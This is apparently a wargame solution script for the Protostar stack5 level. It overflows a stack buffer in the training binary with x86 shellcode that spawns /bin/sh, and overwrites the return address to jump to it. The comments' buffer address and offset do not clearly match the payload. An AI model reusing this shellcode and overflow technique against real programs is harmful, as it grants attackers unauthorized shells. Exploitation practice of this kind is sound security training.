#!/bin/bash
# For the address of the buffer (which contains the shell-code):
# load the debug information with gdb:
#   gdb /opt/protostar/bin/stack5
# In the gdb console run
#   break 7
#   run
#   p &buffer
# to get the address of the buffer (0xbffff838 in this case)
# Then change the return address of the stack, the offset has been found experimentally (in this case 13 bytes)
# 0xbffffd38 (little endian) -> 0x38 0xfd 0xff 0xbf
echo -n -e "\x31\xdb\x8d\x43\x17\xcd\x80\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x800123456789012345678901234567890AAAA0123456789012\x38\xfd\xff\xbf" > exploit
cat exploit - | /opt/protostar/bin/stack5
